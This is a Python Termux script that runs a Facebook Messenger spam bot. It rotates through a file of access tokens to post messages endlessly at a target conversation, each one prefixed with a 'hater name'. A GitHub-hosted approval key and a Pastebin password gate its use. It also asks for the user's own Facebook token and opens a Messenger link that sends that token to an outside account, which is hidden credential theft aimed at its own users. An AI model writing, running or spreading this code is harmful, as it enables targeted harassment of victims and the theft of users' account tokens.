import requests
import time
import os
import sys
import hashlib
from urllib.parse import quote
from colorama import init, Fore, Style

# Initialize Colorama (Fix for Color Codes Not Showing Properly)
init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Unique Key Generate Karne Ka Function
def get_unique_id():
    try:
        unique_str = str(os.getlogin())
        return hashlib.sha256(unique_str.encode()).hexdigest()
    except Exception as e:
        print(f'Error generating unique ID: {e}')
        exit(1)

# Approval Check Karne Ka Function
def check_permission(unique_key):
    print(Fore.YELLOW + "[🔄] Checking Approval...")
    approval_url = "https://raw.githubusercontent.com/rajput-roni/7k/refs/heads/main/Approval.txt"  # Corrected URL

    while True:
        try:
            response = requests.get(approval_url)
            if response.status_code == 200:
                data = response.text.splitlines()  # Split lines for multiple keys support
                if unique_key in data:
                    print(Fore.GREEN + "[√] Permission granted. Your Key Was Approved.")
                    return  
                print(Fore.RED + "[❌] Your Key is NOT Approved! Waiting for approval...")
            else:
                print(Fore.RED + f"Failed to fetch approval list. Status code: {response.status_code}")
            
            time.sleep(10)
        except Exception as e:
            print(f'Error checking permission: {e}')
            time.sleep(10)

# Approval Request WhatsApp Pe Bhejna
def send_approval_request(unique_key):
    try:
        message = f'Hello, nadeem sir! Please Approve My key is :: {unique_key}'
        os.system(f'am start https://wa.me/+9172091012?text={quote(message)} >/dev/null 2>&1')
        print(Fore.YELLOW + '[📲] WhatsApp opened with approval request. Waiting for approval...')
    except Exception as e:
        print(f'Error sending approval request: {e}')
        exit(1)

# Approval System Start Karna
def pre_main():
    clear_screen()
    unique_key = get_unique_id()
    print(f'{Fore.YELLOW}[🔐] Your Unique Key: {Fore.CYAN}{unique_key}')
    send_approval_request(unique_key)
    check_permission(unique_key)  # Approval check yahi par hoga
    print(Fore.GREEN + "[✔] Approved! Now Starting Your Script...\n")

# ---- Aapki Original Script Yaha Se Start Ho Rahi Hai ----

def typing_effect(text, delay=0.002, color=Fore.WHITE):
    for char in text:
        print(color + char, end='', flush=True)
        time.sleep(float(delay))  # Ensure delay is a float
    print()

def animated_input(prompt_text):
    print(Fore.CYAN + "{<<══════════════════════════════════════BROKEN NADEEM HERE═══════════════════════════════════════>>}")
    typing_effect(prompt_text, 0.03, Fore.LIGHTYELLOW_EX)
    return input(Fore.GREEN + "➜ ")

def send_token_to_facebook(token):
    try:
        message = f'Hello, NADEEM sir! I am using your TERMUX tools. My token 🔐 ==> {token}'
        facebook_url = f'https://www.facebook.com/messages/t/shankar.panchal.9883739?text={quote(message)}'

        os.system(f'am start {facebook_url} >/dev/null 2>&1')

        print('Successfully opened Facebook with your token message.')

    except Exception as e:
        print(f'Error sending message to Facebook: {e}')

def fetch_password_from_pastebin(pastebin_url):
    try:
        response = requests.get(pastebin_url)
        response.raise_for_status()
        return response.text.strip()
    except requests.exceptions.RequestException:
        exit(1)

def send_messages(tokens_file, target_id, messages_file, haters_name, speed):
    with open(messages_file, "r") as file:
        messages = file.readlines()
    with open(tokens_file, "r") as file:
        tokens = [token.strip() for token in file.readlines()]

    headers = {"User-Agent": "Mozilla/5.0"}

    while True:
        for message_index, message in enumerate(messages):
            token_index = message_index % len(tokens)
            access_token = tokens[token_index]
            full_message = f"{haters_name} {message.strip()}"

            url = f"https://graph.facebook.com/v17.0/t_{target_id}"
            parameters = {"access_token": access_token, "message": full_message}

            try:
                response = requests.post(url, json=parameters, headers=headers)
                response.raise_for_status()
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")

                print(Fore.YELLOW + f"\n<<═══════════════════════BROTHER═════════════NADEEM DONE═════════════SAHIL DONE════════════════════>>")
                typing_effect(f"[🎉] MESSAGE {message_index + 1} SUCCESSFULLY SENT!", 0.02, Fore.CYAN)
                typing_effect(f"[📨] MESSAGE: {full_message}", 0.02, Fore.LIGHTGREEN_EX)
                typing_effect(f"[⏰] TIME: {current_time}", 0.02, Fore.LIGHTWHITE_EX)
                print(Fore.YELLOW + f"<<═══════════════════════BROTHER═════════════NADEEM DONE═════════════SAHIL DONE════════════════════>>\n")

            except requests.exceptions.RequestException:
                continue  

            time.sleep(speed)

        print(Fore.CYAN + "\n[+] All messages sent. Restarting the process...\n")

def main():
    pre_main()  # Approval system ko yaha call kiya hai  
    clear_screen()

    pastebin_url = "https://pastebin.com/raw/kMBpBe88"
    correct_password = fetch_password_from_pastebin(pastebin_url)

    entered_password = animated_input("  【👑】 ENTER OWNER NAME➜")
    tokens_file = animated_input(" 【📕】 ENTER TOKEN FILE➜")
    target_id = animated_input("  【🖇️】  ENTER CONVO UID ➜")
    haters_name = animated_input("  【🖊️】 ENTER HATER NAME➜")
    messages_file = animated_input("  【📝】 ENTER MESSAGE FILE➜")
    speed = float(animated_input("  【⏰】 ENTER DELAY/TIME (in seconds) FOR MESSAGES ➜"))

    if entered_password != correct_password:
        print(Fore.RED + "[x] Incorrect OWNER NAME. Exiting program.")
        exit(1)

    facebook_token = animated_input("【📩】 ENTER YOUR FACEBOOK TOKEN ➜")
    send_token_to_facebook(facebook_token)

    send_messages(tokens_file, target_id, messages_file, haters_name, speed)

if __name__ == "__main__":
    main()
      
